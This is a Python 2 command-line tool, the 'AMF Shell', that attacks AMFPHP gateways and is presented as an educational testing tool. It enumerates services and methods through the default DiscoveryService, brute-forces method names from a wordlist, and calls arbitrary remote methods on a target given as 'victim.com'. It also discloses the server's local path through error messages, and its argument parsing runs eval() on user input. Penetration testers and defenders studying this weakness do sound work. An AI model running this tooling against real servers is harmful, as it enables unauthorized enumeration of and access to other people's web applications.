#!/usr/bin/env python

"""
Action Message Format (AMF) Shell by George Hedfors

This testing tool demonstrates weaknesses in AMFPHP, especially where
the default service 'DiscoveryService' has been left behind.

WARNING:
This tool is made for educational purposes only and comes with no
warranties or guarantees that it will not break your environment.
"""

import sys
import cmd
from types import *

sys.path.append("pyamf/")
from pyamf.flex import ArrayCollection
from pyamf.remoting.client import RemotingService

class _cmdList(cmd.Cmd):
    intro = "Welcome to Action Message Formate Shell by George Hedfors. Type 'help' for command list.\n"

    def do_help(self, line):
        print "Available commands:"
        print "-----------------------"
        print "brute\t\t\t\tLaunch a method name brute force attack using"
        print "\t\t\t\tcommon names from common.txt"
        print "call methodName(args,..)\tCall a method from the current class. Arguments"
        print "\t\t\t\tmay be single arguments or arrays:"
        print "call methodName(['array','of','stuff'])"
        print "call methodName(arg1,arg2,arg3)"
        print "describe\t\t\tDescribe current class. Lists methods and args."
        print "describe_all\t\t\tLists methods and arguments from all classes"
        print "\t\t\t\tto output file."
        print "help\t\t\t\tWhere all the secrets are..."
        print "list\t\t\t\tLists available classes"
        print "use service.className\t\tChange current class"
        print

    def do_describe_all(self, line):
        output = "%s.txt" % sys.argv[1].split("/")[2]
        fp = open(output, "w")

        i = 0
        e = 0

        for item in self.amf.services:
            fp.write("%s\n" % item)
            result = self.amf.getMethods(item)

            if not hasattr(result, 'code'):
                if type(result[0]) is ListType:
                    fp.write("\tIs accessible but did not return any usable methods.\n")
                else:
                    for key in result[0].keys():
                        fp.write("\t%s(%s)\n" % (key, ", ".join(result[0][key]['arguments'])))
                        if result[0][key]['description'].find("No description") == -1: fp.write("\t- %s\n" % result[0][key]['description'])

                        i += 1
                    else:
                        e += 1

        fp.close()

        print "Exported %d classes and methods to '%s'" % (i, output)
        print "%d error(s) cought" % e

    def do_describe(self, line):
        if self.amf.hasDiscoveryService:
            result = self.amf.getMethods(self.amf.dstClass)

            print result[1]
            print "---------------"

            if hasattr(result, 'code'):
                _printErr(result)
            else:
                if type(result[0]) is ListType:
                    for item in result[0]:
                        print item
                else:
                    for key in result[0].keys():
                        print "%s(%s) - %s" % (key, ", ".join(result[0][key]['arguments']), result[0][key]['description'])
        else:
            print "[+] ERROR: DiscoveryService does not exist, consider trying 'brute'"

    def do_brute(self, line):
        if self.amf.dstClass == "/":
            print "[+] ERROR: You cannot launch a brute force without a valid class."
            return

        if self.amf.hasDiscoveryService:
            print "[+] INFO: This is not necessary as DiscoveryService exists. Use 'list' and 'describe' instead."

        yesno = raw_input('This may seriously harm your environment, are you sure? (y/N): ')

        if yesno == 'y' or yesno == 'Y':
            file = open("common.txt", "r")
            lines = file.readlines()
            file.close()

            print "Testing", len(lines), "methods..."

            for method in lines:
                result = self.amf.execute("%s()" % method.rstrip())

                if result:
                    if hasattr(result, 'code'):
                        if result.code != 'AMFPHP_INEXISTANT_METHOD':
                            _printErr(result)
                    else:
                        if type(result) is BooleanType:
                            print "%s() returned: %s" % (method.rstrip(), result)
                        else:
                            print "%s() returned %d items" % (method.rstrip(), len(result))
                else:
                    print self.amf.err

    def do_list(self, line):
        if self.amf.hasDiscoveryService:
            print "\n".join(self.amf.services)
        else:
            print "[+] ERROR: DiscoveryService wasn't present"

    def do_use(self, line):
        if line == '':
            print "syntax: use className\n"
            return 

        if self.amf.hasClass(line):
            self.amf.dstClass = line
            self.prompt = "(%s) " % (line)
        else:
            _printErr(self.amf.err)

    def do_call(self, line):
        result = self.amf.execute(line)

        if hasattr(result, 'code'):
            _printErr(result)
        else:
            print result

    def do_exit(self, line):
        return True

    def do_EOF(self, line):
        return True


class AMFShell(RemotingService):
    def __init__(self, url):
        RemotingService.__init__(self, url)

        self.dstClass = "amfphp/DiscoveryService"

        self._discoveryService = self._getService(self.dstClass)

        try:
            services = self._discoveryService.getServices()
        except Exception, e:
            print e
            sys.exit(1)

        if hasattr(services, 'code'):
            if services.code == 'AMFPHP_FILE_NOT_FOUND' or services.code == 'AMFPHP_CLASSPATH_NOT_FOUND':
                self.services = None
                self.hasDiscoveryService = False
                self.dstClass = '/'
                return
            else:
                print services
                raise
        else:
            self.hasDiscoveryService = True 

        self.services = list()

        for service in services:
            if service.has_key('children'):
                for child in service['children']:
                    self.services.append("%s%s" % (child['data'], child['label']))
            else:
                self.services.append(service['label'])

    def _getService(self, service):
        return self.getService(service.replace('/', '.'))

    def getMethods(self, service):
        """returns available methods, arguments and descriptions as list()."""

        if self.hasDiscoveryService:
            self._discoveryService = self._getService("amfphp.DiscoveryService")
        
            try:
                methods = self._discoveryService.describeService({'data': '', 'label': service})
            except Exception, e:
                return None

            return methods
        else:
            return None

    def execute(self, dst):
        """executes method(args, ..) and returns result"""
        
        if dst.find('(') == -1:
            return None

        method = dst.split('(')[0]
        args = dst.split('(')[1].split(')')[0]

        service = self._getService(self.dstClass)
        targetMethod = getattr(service, method)

        try:
            if len(args) > 0:
                if args.find('[') != -1:
                    result = targetMethod(eval(args))
                else:
                    result = targetMethod(args.split(','))
            else:
                result = targetMethod()
        except Exception, e:
            self.err = e
            return None

        return result

    def hasClass(self, dstClass):
        """returns if dstClass is usable."""

        service = self._getService(dstClass)
        result = service.nosuchmethod()

        if hasattr(result, 'code'):
            if result.code == 'AMFPHP_FILE_NOT_FOUND':
                self.err = result
                return False
            elif result.code == 'AMFPHP_INEXISTANT_METHOD':
                return True
            else:
                print result
                raise
        else:
            print result
            raise

def _printErr(result):
    print result.description

def _getLocalPath(client):
    service = client.getService("nofile")
    dumb = service.nosuchservice()

    try:
        lpath = dumb.description.split('{')[2].split('}')[0].split('/')
        lpath.pop()
        localPath = "/".join(lpath)
    except:
        return False

    return localPath

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "syntax: %s http://victim.com/amfphp/gateway.php\n" % sys.argv[0]
        sys.exit(1)

    remoteUrl = sys.argv[1]

    try:
        _cmdList.amf = AMFShell(remoteUrl)
        localPath = _getLocalPath(_cmdList.amf)
    except Exception, e:
        print e
        sys.exit()

    if _cmdList.amf.hasDiscoveryService:
        print "[+] AMFPHP exists and appears to be vulnerable to 'DiscoveryService'."
        print "[*] To disable 'DiscoveryServices', remove %s/amfphp/DiscoveryService.php\n" % localPath
    else:
        print "[+] AMFPHP exists but appears not to be vulnerable to 'DiscoveryService'. Listing services will not work.\n"

    _cmdList.prompt = "(%s) " % (_cmdList.amf.dstClass)
    _cmdList().cmdloop()
